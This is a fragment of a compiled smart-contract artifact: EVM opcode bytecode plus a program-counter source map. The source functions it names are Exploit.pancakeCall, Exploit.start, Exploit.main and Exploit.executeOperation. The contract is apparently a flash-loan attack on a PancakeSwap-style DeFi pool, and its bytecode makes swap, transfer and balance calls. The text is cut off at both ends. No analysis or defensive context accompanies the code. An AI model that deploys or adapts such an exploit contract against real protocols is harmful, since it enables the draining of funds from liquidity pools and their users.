RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0xECD SWAP2 SWAP1 PUSH2 0x14DF JUMP JUMPDEST POP PUSH1 0x10 SLOAD PUSH1 0x40 MLOAD PUSH4 0x22C0D9F PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 DUP2 ADD DUP4 SWAP1 MSTORE PUSH1 0x0 PUSH1 0x24 DUP3 ADD DUP2 SWAP1 MSTORE ADDRESS PUSH1 0x44 DUP4 ADD MSTORE PUSH1 0x80 PUSH1 0x64 DUP4 ADD MSTORE PUSH1 0x84 DUP3 ADD MSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP2 AND SWAP1 PUSH4 0x22C0D9F SWAP1 PUSH1 0xA4 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0xF2F JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0xF43 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x7 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH4 0x3D18B912 PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0xF97 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0xFAB JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP PUSH1 0x4 DUP1 SLOAD PUSH1 0x40 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS SWAP3 DUP2 ADD SWAP3 SWAP1 SWAP3 MSTORE PUSH1 0x0 SWAP4 POP PUSH1 0x1 SWAP3 POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND SWAP1 PUSH4 0x70A08231 SWAP1 PUSH1 0x24 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 GAS CALL ISZERO DUP1 ISZERO PUSH2 0x1000 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x1024 SWAP2 SWAP1 PUSH2 0x14C6 JUMP JUMPDEST PUSH2 0x102E SWAP2 SWAP1 PUSH2 0x13EA JUMP JUMPDEST SWAP1 POP PUSH1 0x0 DUP1 PUSH1 0x11 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH4 0x902F1AC PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x60 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x1086 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x10AA SWAP2 SWAP1 PUSH2 0x1376 JUMP JUMPDEST POP PUSH1 0x12 SLOAD PUSH1 0x40 MLOAD PUSH4 0x1535435 PUSH1 0xE2 SHL DUP2 MSTORE PUSH1 0x4 DUP2 ADD DUP8 SWAP1 MSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB SWAP3 DUP4 AND PUSH1 0x24 DUP3 ADD DUP2 SWAP1 MSTORE SWAP4 SWAP1 SWAP3 AND PUSH1 0x44 DUP4 ADD DUP2 SWAP1 MSTORE SWAP5 POP SWAP2 SWAP3 POP DUP5 SWAP2 PUSH1 0x0 SWAP2 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP2 AND SWAP1 PUSH4 0x54D50D4 SWAP1 PUSH1 0x64 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x111B JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x113F SWAP2 SWAP1 PUSH2 0x14C6 JUMP JUMPDEST PUSH1 0x4 DUP1 SLOAD PUSH1 0x11 SLOAD PUSH1 0x40 MLOAD PUSH4 0xA9059CBB PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP2 DUP3 AND SWAP4 DUP2 ADD SWAP4 SWAP1 SWAP4 MSTORE PUSH1 0x24 DUP4 ADD DUP7 SWAP1 MSTORE SWAP3 SWAP4 POP SWAP2 SWAP1 SWAP2 AND SWAP1 PUSH4 0xA9059CBB SWAP1 PUSH1 0x44 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 GAS CALL ISZERO DUP1 ISZERO PUSH2 0x119C JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x11C0 SWAP2 SWAP1 PUSH2 0x14DF JUMP JUMPDEST POP PUSH1 0x11 SLOAD PUSH1 0x40 MLOAD PUSH4 0x22C0D9F PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 DUP2 ADD DUP4 SWAP1 MSTORE PUSH1 0x0 PUSH1 0x24 DUP3 ADD DUP2 SWAP1 MSTORE ADDRESS PUSH1 0x44 DUP4 ADD MSTORE PUSH1 0x80 PUSH1 0x64 DUP4 ADD MSTORE PUSH1 0x84 DUP3 ADD MSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP2 AND SWAP1 PUSH4 0x22C0D9F SWAP1 PUSH1 0xA4 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x1222 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x1236 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP POP POP POP POP POP POP POP POP POP POP JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 AND DUP2 EQ PUSH2 0x125B JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 DUP1 PUSH1 0x0 PUSH1 0x80 DUP7 DUP9 SUB SLT ISZERO PUSH2 0x1276 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP6 CALLDATALOAD PUSH2 0x1281 DUP2 PUSH2 0x1246 JUMP JUMPDEST SWAP5 POP PUSH1 0x20 DUP7 ADD CALLDATALOAD SWAP4 POP PUSH1 0x40 DUP7 ADD CALLDATALOAD SWAP3 POP PUSH1 0x60 DUP7 ADD CALLDATALOAD PUSH8 0xFFFFFFFFFFFFFFFF DUP1 DUP3 GT ISZERO PUSH2 0x12AC JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 DUP9 ADD SWAP2 POP DUP9 PUSH1 0x1F DUP4 ADD SLT PUSH2 0x12C0 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 CALLDATALOAD DUP2 DUP2 GT ISZERO PUSH2 0x12CF JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP10 PUSH1 0x20 DUP3 DUP6 ADD ADD GT ISZERO PUSH2 0x12E1 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST SWAP7 SWAP10 SWAP6 SWAP9 POP SWAP4 SWAP7 POP PUSH1 0x20 ADD SWAP5 SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x40 DUP4 DUP6 SUB SLT ISZERO PUSH2 0x1307 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP POP DUP1 CALLDATALOAD SWAP3 PUSH1 0x20 SWAP1 SWAP2 ADD CALLDATALOAD SWAP2 POP JUMP JUMPDEST PUSH4 0x4E487B71 PUSH1 0xE0 SHL PUSH1 0x0 MSTORE PUSH1 0x11 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH1 0x0 DUP3 NOT DUP3 GT ISZERO PUSH2 0x133F JUMPI PUSH2 0x133F PUSH2 0x1316 JUMP JUMPDEST POP ADD SWAP1 JUMP JUMPDEST PUSH4 0x4E487B71 PUSH1 0xE0 SHL PUSH1 0x0 MSTORE PUSH1 0x32 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST DUP1 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP2 AND DUP2 EQ PUSH2 0x1371 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 PUSH1 0x60 DUP5 DUP7 SUB SLT ISZERO PUSH2 0x138B JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x1394 DUP5 PUSH2 0x135A JUMP JUMPDEST SWAP3 POP PUSH2 0x13A2 PUSH1 0x20 DUP6 ADD PUSH2 0x135A JUMP JUMPDEST SWAP2 POP PUSH1 0x40 DUP5 ADD MLOAD PUSH4 0xFFFFFFFF DUP2 AND DUP2 EQ PUSH2 0x13BB JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP1 SWAP2 POP POP SWAP3 POP SWAP3 POP SWAP3 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x13D8 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 MLOAD PUSH2 0x13E3 DUP2 PUSH2 0x1246 JUMP JUMPDEST SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP3 DUP3 LT ISZERO PUSH2 0x13FC JUMPI PUSH2 0x13FC PUSH2 0x1316 JUMP JUMPDEST POP SUB SWAP1 JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD DUP1 DUP5 MSTORE PUSH1 0x0 JUMPDEST DUP2 DUP2 LT ISZERO PUSH2 0x1427 JUMPI PUSH1 0x20 DUP2 DUP6 ADD DUP2 ADD MLOAD DUP7 DUP4 ADD DUP3 ADD MSTORE ADD PUSH2 0x140B JUMP JUMPDEST DUP2 DUP2 GT ISZERO PUSH2 0x1439 JUMPI PUSH1 0x0 PUSH1 0x20 DUP4 DUP8 ADD ADD MSTORE JUMPDEST POP PUSH1 0x1F ADD PUSH1 0x1F NOT AND SWAP3 SWAP1 SWAP3 ADD PUSH1 0x20 ADD SWAP3 SWAP2 POP POP JUMP JUMPDEST DUP5 DUP2 MSTORE DUP4 PUSH1 0x20 DUP3 ADD MSTORE PUSH1 0x1 DUP1 PUSH1 0xA0 SHL SUB DUP4 AND PUSH1 0x40 DUP3 ADD MSTORE PUSH1 0x80 PUSH1 0x60 DUP3 ADD MSTORE PUSH1 0x0 PUSH2 0x147B PUSH1 0x80 DUP4 ADD DUP5 PUSH2 0x1401 JUMP JUMPDEST SWAP7 SWAP6 POP POP POP POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 PUSH1 0x0 NOT DIV DUP4 GT DUP3 ISZERO ISZERO AND ISZERO PUSH2 0x149F JUMPI PUSH2 0x149F PUSH2 0x1316 JUMP JUMPDEST POP MUL SWAP1 JUMP JUMPDEST PUSH1 0x0 DUP3 PUSH2 0x14C1 JUMPI PUSH4 0x4E487B71 PUSH1 0xE0 SHL PUSH1 0x0 MSTORE PUSH1 0x12 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST POP DIV SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x14D8 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x14F1 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 MLOAD DUP1 ISZERO ISZERO DUP2 EQ PUSH2 0x13E3 JUMPI PUSH1 0x0 DUP1 REVERT INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 PUSH16 0x25289F5CEF75C845902483302C8A5FFD BALANCE 0xA7 0xF7 OR 0xA6 0xBB 0xC 0xEF 0xC7 SMOD 0xA9 SWAP3 0xBB BASEFEE 0xCE PUSH5 0x736F6C6343 STOP ADDMOD 0xF STOP CALLER ",
  "pcMap": {
    "0": {
      "offset": [
        85,
        5424
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x80"
    },
    "2": {
      "fn": null,
      "offset": [
        85,
        5424
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "4": {
      "fn": null,
      "offset": [
        85,
        5424
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "5": {
      "fn": null,
      "offset": [
        85,
        5424
      ],
      "op": "CALLVALUE",
      "path": "0"
    },
    "6": {
      "fn": null,
      "offset": [
        85,
        5424
      ],
      "op": "DUP1",
      "path": "0"
    },
    "7": {
      "fn": null,
      "offset": [
        85,
        5424
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "8": {
      "fn": null,
      "offset": [
        85,
        5424
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x10"
    },
    "11": {
      "fn": null,
      "offset": [
        85,
        5424
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "12": {
      "fn": null,
      "offset": [
        85,
        5424
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "14": {
      "fn": null,
      "offset": [
        85,
        5424
      ],
      "op": "DUP1",
      "path": "0"
    },
    "15": {
      "dev": "Cannot send ether to nonpayable function",
      "fn": null,
      "offset": [
        85,
        5424
      ],
      "op": "REVERT",
      "path": "0"
    },
    "16": {
      "fn": null,
      "offset": [
        85,
        5424
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "17": {
      "fn": null,
      "offset": [
        85,
        5424
      ],
      "op": "POP",
      "path": "0"
    },
    "18": {
      "fn": null,
      "offset": [
        85,
        5424
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x4"
    },
    "20": {
      "fn": null,
      "offset": [
        85,
        5424
      ],
      "op": "CALLDATASIZE",
      "path": "0"
    },
    "21": {
      "fn": null,
      "offset": [
        85,
        5424
      ],
      "op": "LT",
      "path": "0"
    },
    "22": {
      "fn": null,
      "offset": [
        85,
        5424
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x4C"
    },
    "25": {
      "fn": null,
      "offset": [
        85,
        5424
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "26": {
      "fn": null,
      "offset": [
        85,
        5424
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "28": {
      "fn": null,
      "offset": [
        85,
        5424
      ],
      "op": "CALLDATALOAD",
      "path": "0"
    },
    "29": {
      "fn": null,
      "offset": [
        85,
        5424
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0xE0"
    },
    "31": {
      "fn": null,
      "offset": [
        85,
        5424
      ],
      "op": "SHR",
      "path": "0"
    },
    "32": {
      "fn": null,
      "offset": [
        85,
        5424
      ],
      "op": "DUP1",
      "path": "0"
    },
    "33": {
      "fn": null,
      "offset": [
        85,
        5424
      ],
      "op": "PUSH4",
      "path": "0",
      "value": "0x84800812"
    },
    "38": {
      "fn": null,
      "offset": [
        85,
        5424
      ],
      "op": "EQ",
      "path": "0"
    },
    "39": {
      "fn": null,
      "offset": [
        85,
        5424
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x51"
    },
    "42": {
      "fn": null,
      "offset": [
        85,
        5424
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "43": {
      "fn": null,
      "offset": [
        85,
        5424
      ],
      "op": "DUP1",
      "path": "0"
    },
    "44": {
      "fn": null,
      "offset": [
        85,
        5424
      ],
      "op": "PUSH4",
      "path": "0",
      "value": "0xBE9A6555"
    },
    "49": {
      "fn": null,
      "offset": [
        85,
        5424
      ],
      "op": "EQ",
      "path": "0"
    },
    "50": {
      "fn": null,
      "offset": [
        85,
        5424
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x66"
    },
    "53": {
      "fn": null,
      "offset": [
        85,
        5424
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "54": {
      "fn": null,
      "offset": [
        85,
        5424
      ],
      "op": "DUP1",
      "path": "0"
    },
    "55": {
      "fn": null,
      "offset": [
        85,
        5424
      ],
      "op": "PUSH4",
      "path": "0",
      "value": "0xDFFEADD0"
    },
    "60": {
      "fn": null,
      "offset": [
        85,
        5424
      ],
      "op": "EQ",
      "path": "0"
    },
    "61": {
      "fn": null,
      "offset": [
        85,
        5424
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x6E"
    },
    "64": {
      "fn": null,
      "offset": [
        85,
        5424
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "65": {
      "fn": null,
      "offset": [
        85,
        5424
      ],
      "op": "DUP1",
      "path": "0"
    },
    "66": {
      "fn": null,
      "offset": [
        85,
        5424
      ],
      "op": "PUSH4",
      "path": "0",
      "value": "0xEE872558"
    },
    "71": {
      "fn": null,
      "offset": [
        85,
        5424
      ],
      "op": "EQ",
      "path": "0"
    },
    "72": {
      "fn": null,
      "offset": [
        85,
        5424
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x76"
    },
    "75": {
      "fn": null,
      "offset": [
        85,
        5424
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "76": {
      "fn": null,
      "offset": [
        85,
        5424
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "77": {
      "fn": null,
      "offset": [
        85,
        5424
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "79": {
      "fn": null,
      "offset": [
        85,
        5424
      ],
      "op": "DUP1",
      "path": "0"
    },
    "80": {
      "first_revert": true,
      "fn": null,
      "offset": [
        85,
        5424
      ],
      "op": "REVERT",
      "path": "0"
    },
    "81": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        2811,
        3955
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "82": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        2811,
        3955
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x64"
    },
    "85": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        2811,
        3955
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x5F"
    },
    "88": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        2811,
        3955
      ],
      "op": "CALLDATASIZE",
      "path": "0"
    },
    "89": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        2811,
        3955
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x4"
    },
    "91": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        2811,
        3955
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x125E"
    },
    "94": {
      "fn": "Exploit.pancakeCall",
      "jump": "i",
      "offset": [
        2811,
        3955
      ],
      "op": "JUMP",
      "path": "0"
    },
    "95": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        2811,
        3955
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "96": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        2811,
        3955
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x89"
    },
    "99": {
      "fn": "Exploit.pancakeCall",
      "jump": "i",
      "offset": [
        2811,
        3955
      ],
      "op": "JUMP",
      "path": "0"
    },
    "100": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        2811,
        3955
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "101": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        2811,
        3955
      ],
      "op": "STOP",
      "path": "0"
    },
    "102": {
      "fn": "Exploit.start",
      "offset": [
        1860,
        2233
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "103": {
      "fn": "Exploit.start",
      "offset": [
        1860,
        2233
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x64"
    },
    "106": {
      "fn": "Exploit.start",
      "offset": [
        1860,
        2233
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x57E"
    },
    "109": {
      "fn": "Exploit.start",
      "jump": "i",
      "offset": [
        1860,
        2233
      ],
      "op": "JUMP",
      "path": "0"
    },
    "110": {
      "fn": "Exploit.main",
      "offset": [
        2239,
        2805
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "111": {
      "fn": "Exploit.main",
      "offset": [
        2239,
        2805
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x64"
    },
    "114": {
      "fn": "Exploit.main",
      "offset": [
        2239,
        2805
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x80D"
    },
    "117": {
      "fn": "Exploit.main",
      "jump": "i",
      "offset": [
        2239,
        2805
      ],
      "op": "JUMP",
      "path": "0"
    },
    "118": {
      "fn": "Exploit.executeOperation",
      "offset": [
        3965,
        4195
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "119": {
      "fn": "Exploit.executeOperation",
      "offset": [
        3965,
        4195
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x64"
    },
    "122": {
      "fn": "Exploit.executeOperation",
      "offset": [
        3965,
        4195
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x84"
    },
    "125": {
      "fn": "Exploit.executeOperation",
      "offset": [
        3965,
        4195
      ],
      "op": "CALLDATASIZE",
      "path": "0"
    },
    "126": {
      "fn": "Exploit.executeOperation",
      "offset": [
        3965,
        4195
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x4"
    },
    "128": {
      "fn": "Exploit.executeOperation",
      "offset": [
        3965,
        4195
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x125E"
    },
    "131": {
      "fn": "Exploit.executeOperation",
      "jump": "i",
      "offset": [
        3965,
        4195
      ],
      "op": "JUMP",
      "path": "0"
    },
    "132": {
      "fn": "Exploit.executeOperation",
      "offset": [
        3965,
        4195
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "133": {
      "fn": "Exploit.executeOperation",
      "offset": [
        3965,
        4195
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x9F2"
    },
    "136": {
      "fn": "Exploit.executeOperation",
      "jump": "i",
      "offset": [
        3965,
        4195
      ],
      "op": "JUMP",
      "path": "0"
    },
    "137": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        2811,
        3955
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "138": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        2929,
        2939
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "140": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        2943,
        2974
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x97"
    },
    "143": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        2943,
        2974
      ],
      "op": "DUP3",
      "path": "0"
    },
    "144": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        2943,
        2974
      ],
      "op": "DUP5",
      "path": "0"
    },
    "145": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        2943,
        2974
      ],
      "op": "ADD",
      "path": "0"
    },
    "146": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        2954,
        2959
      ],
      "op": "DUP5",
      "path": "0"
    },
    "147": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        2943,
        2974
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x12F4"
    },
    "150": {
      "fn": "Exploit.pancakeCall",
      "jump": "i",
      "offset": [
        2943,
        2974
      ],
      "op": "JUMP",
      "path": "0"
    },
    "151": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        2943,
        2974
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "152": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        2926,
        2974
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "153": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        2926,
        2974
      ],
      "op": "POP",
      "path": "0"
    },
    "154": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        2926,
        2974
      ],
      "op": "POP",
      "path": "0"
    },
    "155": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        2992,
        2993
      ],
      "op": "PUSH1",
      "path": "0",
      "statement": 0,
      "value": "0x1"
    },
    "157": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        2984,
        2988
      ],
      "op": "DUP1",
      "path": "0"
    },
    "158": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        2984,
        2988
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "160": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        2984,
        2993
      ],
      "op": "DUP3",
      "path": "0"
    },
    "161": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        2984,
        2993
      ],
      "op": "DUP3",
      "path": "0"
    },
    "162": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        2984,
        2993
      ],
      "op": "SLOAD",
      "path": "0"
    },
    "163": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        2984,
        2993
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0xAC"
    },
    "166": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        2984,
        2993
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "167": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        2984,
        2993
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "168": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        2984,
        2993
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x132C"
    },
    "171": {
      "fn": "Exploit.pancakeCall",
      "jump": "i",
      "offset": [
        2984,
        2993
      ],
      "op": "JUMP",
      "path": "0"
    },
    "172": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        2984,
        2993
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "173": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        2984,
        2993
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "174": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        2984,
        2993
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "175": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        2984,
        2993
      ],
      "op": "SSTORE",
      "path": "0"
    },
    "176": {
      "op": "POP"
    },
    "177": {
      "op": "POP"
    },
    "178": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3006,
        3010
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x1"
    },
    "180": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3006,
        3010
      ],
      "op": "SLOAD",
      "path": "0"
    },
    "181": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3013,
        3014
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x7"
    },
    "183": {
      "op": "GT"
    },
    "184": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3003,
        3671
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "185": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3003,
        3671
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x35E"
    },
    "188": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3003,
        3671
